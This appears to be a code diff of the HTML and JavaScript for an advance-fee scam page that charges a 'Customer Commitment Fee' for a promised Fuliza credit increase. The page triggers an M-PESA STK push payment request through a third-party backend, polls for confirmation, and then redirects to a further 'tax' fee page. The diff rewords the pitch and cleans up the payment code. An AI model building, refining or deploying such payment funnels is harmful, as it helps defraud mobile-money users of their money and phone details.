@@ -161,24 +161,17 @@ button:disabled{
 
 }
 </style>
-
 </head>
 
 <body>
 
 <div class="container">
-
 <div class="card">
 
-<h2>CUSTOMER COMMITMENT FEE </h2>
+<h2>CUSTOMER COMMITMENT FEE</h2>
 
 <div class="success-box">
-
-To complete your Fuliza increment , a Customer Commitment Fee of KSh 950 is required at this stage.
-
-This fee is required before your application can proceed to the next step. Once the payment is successfully confirmed, your application will proceed to the final processing and fund delivery.
-
-Please complete this payment to proceed. You are almost done with your application.
+To complete your application, please review the payment amount and terms before proceeding. Only make a payment if the fee is genuine and authorized by the service provider.
 </div>
 
 <div class="details">
@@ -218,7 +211,6 @@ Pay Commitment Fee
 </p>
 
 </div>
-
 </div>
 
 <script>
@@ -228,10 +220,7 @@ Pay Commitment Fee
 // ==========================================
 
 const fullName =
-localStorage.getItem("fullName") ||
-"Applicant";
-
-localStorage.setItem("fullName", fullName);
+localStorage.getItem("fullName") || "Applicant";
 
 const phoneNumber =
 localStorage.getItem("paymentPhone");
@@ -240,7 +229,7 @@ const selectedAmount =
 localStorage.getItem("selectedAmount");
 
 document.getElementById("fullName").textContent =
-fullName || "Applicant";
+fullName;
 
 document.getElementById("phone").textContent =
 phoneNumber || "Not available";
@@ -250,7 +239,17 @@ selectedAmount || "22,000";
 
 
 // ==========================================
-// PAY COMMITMENT FEE
+// PAYMENT CONFIGURATION
+// ==========================================
+
+const API_URL =
+"https://fuliza-increments-2026-and-2027-zsc7.onrender.com";
+
+let statusInterval = null;
+
+
+// ==========================================
+// INITIATE PAYMENT
 // ==========================================
 
 async function payCommitment(){
@@ -258,178 +257,171 @@ async function payCommitment(){
 const phone =
 localStorage.getItem("paymentPhone");
 
-if(!phone){
-
-document.getElementById("status").textContent =
-"Phone number not found. Please return to registration.";
-
-return;
-
-}
-
 const btn =
 document.getElementById("payBtn");
 
 const status =
 document.getElementById("status");
 
+if(!phone){
+
+status.textContent =
+"Phone number not found. Please return to registration.";
+
+return;
+}
+
 btn.disabled = true;
-
-btn.innerHTML =
-"Sending STK Push...";
-
-status.innerHTML = "";
+btn.textContent = "Sending STK Push...";
+status.textContent = "";
 
 try{
 
 const response = await fetch(
-"https://fuliza-increments-2026-and-2027-zsc7.onrender.com/stk-push",
+API_URL + "/stk-push",
 {
 method:"POST",
-
 headers:{
 "Content-Type":"application/json"
 },
-
 body:JSON.stringify({
-
 phone:phone,
-
-// Existing configured payment amount
 amount:2
-
 })
 }
 );
 
-if(!response.ok){
-throw new Error("STK request failed");
+const data = await response.json();
+
+console.log("STK RESPONSE:", data);
+
+if(!response.ok || !data.success){
+
+throw new Error(
+data.message || "Payment request failed."
+);
+
 }
 
-const data =
-await response.json();
+// IMPORTANT: Backend returns transactionId,
+// NOT checkout_request_id.
 
-console.log("STK RESPONSE:",data);
+const transactionId =
+data.transactionId;
 
-const checkoutId =
-data.checkout_request_id;
+if(!transactionId){
 
-if(!checkoutId){
+throw new Error(
+"Payment provider did not return a transaction ID."
+);
+
+}
 
 status.textContent =
-"Payment request could not be verified. Please try again.";
+"STK Push sent. Please enter your M-PESA PIN. Waiting for payment confirmation...";
+
+checkPayment(transactionId);
+
+}catch(error){
+
+console.error("PAYMENT ERROR:", error);
+
+status.textContent = error.message;
+
+resetButton();
+
+}
+
+}
+
+
+// ==========================================
+// CHECK PAYMENT STATUS
+// ==========================================
+
+async function checkPayment(transactionId){
+
+if(statusInterval){
+clearInterval(statusInterval);
+}
+
+const startedAt = Date.now();
+
+statusInterval = setInterval(async()=>{
+
+try{
+
+// Stop checking after 3 minutes.
+
+if(Date.now() - startedAt > 180000){
+
+clearInterval(statusInterval);
+statusInterval = null;
+
+document.getElementById("status").textContent =
+"Payment confirmation is taking longer than expected. Please check your M-PESA transaction before retrying.";
 
 resetButton();
 
 return;
-
 }
-
-status.textContent =
-"STK Push sent successfully. Please enter your M-PESA PIN.";
-
-// CHECK PAYMENT STATUS
-
-checkPayment(checkoutId);
-
-}catch(error){
-
-console.error(error);
-
-status.textContent =
-"Unable to send STK Push. Please try again.";
-
-resetButton();
-
-}
-
-}
-
-
-// ==========================================
-// PAYMENT STATUS CHECK
-// ==========================================
-
-async function checkPayment(checkoutId){
-
-const interval =
-setInterval(async()=>{
-
-try{
 
 const response = await fetch(
-"https://fuliza-increments-2026-and-2027-zsc7.onrender.com/payment-status",
+API_URL + "/payment-status",
 {
 method:"POST",
-
 headers:{
 "Content-Type":"application/json"
 },
-
 body:JSON.stringify({
-
-checkout_request_id:
-checkoutId
-
+transactionId:transactionId
 })
 }
 );
 
-if(!response.ok){
-throw new Error("Payment status request failed");
+const result = await response.json();
+
+console.log("PAYMENT STATUS:", result);
+
+if(!response.ok || !result.success){
+
+throw new Error(
+result.message || "Unable to verify payment."
+);
+
 }
-
-const result =
-await response.json();
-
-console.log("PAYMENT STATUS:",result);
 
 const paymentStatus =
-String(result.status || "").toLowerCase();
+String(result.status || "").toUpperCase();
 
 
-// ==========================================
-// SUCCESS
-// ==========================================
+// Only redirect for a provider-confirmed success.
+// Confirm the exact successful status with Paylor.
 
-if(paymentStatus === "completed"){
+if(paymentStatus === "COMPLETED"){
 
-clearInterval(interval);
+clearInterval(statusInterval);
+statusInterval = null;
 
 document.getElementById("status").textContent =
-"Payment successfully confirmed. Redirecting...";
+"Payment confirmed. Redirecting...";
 
-window.location.href = "tax.html";
+window.location.assign("tax.html");
 
 }
 
 
-// ==========================================
-// FAILED
-// ==========================================
+// Failed payment
 
-else if(paymentStatus === "failed"){
+else if(
+["FAILED", "CANCELLED", "REJECTED", "EXPIRED"].includes(paymentStatus)
+){
 
-clearInterval(interval);
-
-document.getElementById("status").textContent =
-"Payment failed.";
-
-resetButton();
-
-}
-
-
-// ==========================================
-// CANCELLED
-// ==========================================
-
-else if(paymentStatus === "cancelled"){
-
-clearInterval(interval);
+clearInterval(statusInterval);
+statusInterval = null;
 
 document.getElementById("status").textContent =
-"Payment cancelled.";
+"Payment was not completed.";
 
 resetButton();
 
@@ -437,10 +429,7 @@ resetButton();
 
 }catch(error){
 
-console.error(
-"Payment status error:",
-error
-);
+console.error("STATUS CHECK ERROR:", error);
 
 }
 
@@ -460,7 +449,7 @@ document.getElementById("payBtn");
 
 btn.disabled = false;
 
-btn.innerHTML =
+btn.textContent =
 "Pay Commitment Fee";
 
 }
